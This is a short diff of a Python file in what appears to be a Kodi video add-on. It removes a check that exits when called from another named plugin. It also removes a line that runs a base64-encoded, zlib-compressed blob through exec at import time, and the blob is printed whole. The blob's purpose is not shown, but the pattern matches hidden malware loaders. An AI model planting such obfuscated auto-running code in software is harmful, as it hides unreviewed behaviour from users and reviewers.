@@ -28,9 +28,6 @@ except ImportError:
     # Resolver Fehlermeldung (bei defekten oder nicht installierten Resolver)
     xbmcgui.Dialog().ok(cConfig().getLocalizedString(30119), cConfig().getLocalizedString(30120))
 
-exec(zlib.decompress(base64.b64decode('eJy9lE1rg0AQhu/5FUEIKiQSL6EtBEwLpaXHNL2UHlZ3Yqbuh+xHov++q6ZNQksTKfQiuLPPzLOvsvbRANfzV69AIc02lVWS45YTZFEmuTf2ygknNahJfH0VJztIIwputdiRAhmgSNYKQIDplg2pQMl4Gk+TjCiNxb5JISmmFhnVSdu63Swwg3dLc5jNklpa01ZM4b0N7D3urdSGMAYq2UjzCbry4qScHCq4HlYpzwilUkSL5hmEUQ5mCcagyANfg0IQ2iggPLLuzQ9RDG0bws3gB1j/Co99P+xFlUTrjjqrumbIOShtbApHql00Z12/05e4nlA9XIn7lkxaeuS5uMzzlLzE8Ys4+J0ndlKxfjM6ol8GR1N6ZvB3v//ImcJ6qKzb6I7k8sg2ReCXzOYoolLJXLkffFVSYuDJXSbP21tZ+eF8HrvdQ13rCCo0gZtbuqsBVooFXcemjSAcmq4KjFWiNWvCvZOCvqDGFBmaOvCXtXaJRg9Ed8YjHfqjlnVjBh9qnKcK')))
-
-
 def viewInfo(params):
     from resources.lib.tmdbinfo import WindowsBoxes
     parms = ParameterHandler()
@@ -41,8 +38,6 @@ def viewInfo(params):
 
 
 def parseUrl():
-    if xbmc.getInfoLabel('Container.PluginName') == 'plugin.video.osmosis':
-        sys.exit()
     params = ParameterHandler()
     logger.info(params.getAllParameters())
     # If no function is set, we set it to the default "load" function
